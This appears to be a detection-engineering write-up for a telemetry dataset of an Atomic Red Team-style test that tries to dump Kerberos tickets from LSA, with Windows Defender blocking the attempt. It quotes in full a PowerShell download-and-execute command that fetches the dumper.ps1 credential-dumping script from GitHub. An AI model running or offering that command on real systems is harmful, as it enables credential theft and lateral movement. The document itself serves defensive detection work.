# T1003.004-2: LSA Secrets — Dump Kerberos Tickets from LSA using dumper.ps1

## Technique Context

T1003.004 (LSA Secrets) involves accessing the Local Security Authority (LSA) to extract security-related information including Kerberos tickets, NTLM hashes, and other authentication credentials stored in memory. This technique is commonly used by adversaries after achieving privileged access to harvest credentials for lateral movement. The dumper.ps1 script referenced in this test is part of the PowershellKerberos toolkit that attempts to extract Kerberos tickets from LSA memory. Detection engineers typically focus on LSASS process access patterns, privilege escalation events, and suspicious PowerShell execution that interacts with authentication subsystems.

## What This Dataset Contains

This dataset captures Windows Defender successfully blocking the credential dumping attempt. The attack begins with PowerShell execution containing the command line `"powershell.exe" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}` (Security EID 4688). The PowerShell channel shows the attempt to download and execute the script with `New-Object Net.WebClient` (EID 4103), followed by a critical PowerShell error event (EID 4100) stating "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`. Sysmon captures extensive .NET framework loading (EIDs 7) for PowerShell processes, process creation events for the initial PowerShell session and child `whoami.exe` process (EID 1), and process access events (EID 10) showing PowerShell accessing both the whoami.exe and child PowerShell processes with full access rights (0x1FFFFF). The dataset also shows privilege elevation events (Security EID 4703) with multiple high-privilege tokens being enabled including SeBackupPrivilege and SeRestorePrivilege.

## What This Dataset Does Not Contain

The dataset lacks the actual credential dumping behavior because Windows Defender's real-time protection blocked the malicious script before it could execute its LSA access functionality. There are no LSASS process access events, no credential extraction artifacts, no suspicious registry access to security hives, and no file system artifacts typically associated with credential dumping tools. The network telemetry shows only Windows Defender's threat intelligence connections rather than the intended script download. Most critically, there are no events indicating successful interaction with the LSA subsystem or Kerberos ticket extraction.

## Assessment

This dataset provides excellent telemetry for detecting the delivery and initial execution phases of LSA credential dumping attempts, but limited visibility into the actual credential access behaviors due to Defender's intervention. The PowerShell logging is comprehensive, capturing both the download attempt and the explicit blocking action. The Sysmon process creation and access events provide strong process lineage and behavioral indicators. However, for detection engineers building rules specifically for successful LSA access patterns, this dataset primarily demonstrates how modern EDR solutions prevent technique completion while generating detectable attempt signatures. The privilege escalation telemetry and suspicious PowerShell command line patterns remain valuable for building preventive detections.

## Detection Opportunities Present in This Data

1. PowerShell command line containing suspicious GitHub repository references and script execution patterns from Security EID 4688 events
2. PowerShell Error events (EID 4100) indicating antivirus blocking of malicious content with specific error IDs like "ScriptContainedMaliciousContent"
3. Net.WebClient object instantiation in PowerShell for remote script downloads from PowerShell EID 4103 command invocation events
4. Process access events (Sysmon EID 10) showing PowerShell processes accessing other processes with full rights (0x1FFFFF)
5. Token privilege adjustment events (Security EID 4703) showing elevation of sensitive privileges like SeBackupPrivilege and SeRestorePrivilege
6. Process creation chains involving nested PowerShell executions with suspicious command line parameters
7. File creation events for PowerShell startup profile data in system profile directories (Sysmon EID 11)
8. Named pipe creation patterns associated with PowerShell remoting and execution frameworks (Sysmon EID 17)
